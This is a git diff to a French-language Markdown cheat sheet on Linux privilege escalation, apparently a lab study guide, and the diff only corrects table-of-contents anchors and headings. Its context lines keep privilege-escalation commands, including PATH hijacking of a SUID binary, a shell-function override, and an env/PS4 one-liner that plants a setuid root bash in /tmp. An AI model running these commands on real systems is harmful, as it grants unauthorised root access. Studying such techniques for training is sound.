@@ -11,8 +11,8 @@ Des techniques pour de la PrivEsc sur linux !
 - [Cron Jobs - Wildcard](#Cron-Jobs---Wildcard)
 - [Executables - Shared Object Injection](#Executables---Shared-Object-Injection)
 - [Executables - Environment Variables ](#Executables---Environment-Variables)
-- [Executables - Abusing Shell Features (#1)](#Executables---Abusing-Shell-Features-(1))
-- [Executables - Abusing Shell Features (#2)](#Executables---Abusing-Shell-Features-(2))
+- [Executables - Abusing Shell Features (#1)](#Executables---Abusing-Shell-Features-1)
+- [Executables - Abusing Shell Features (#2)](#Executables---Abusing-Shell-Features-2)
 
 ## Commande find
 
@@ -298,7 +298,7 @@ PATH=.:$PATH /usr/local/bin/suid-env
 <br>
 <br>
 
-## Executables - Abusing Shell Features (1) 
+## Executables - Abusing Shell Features 1
 
 ```
 user@debian:~$ strings /usr/local/bin/suid-env2
@@ -341,7 +341,7 @@ export -f /usr/sbin/service
 <br>
 <br>
 
-## Executables - Abusing Shell Features (2)
+## Executables - Abusing Shell Features 2
 
 ```
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
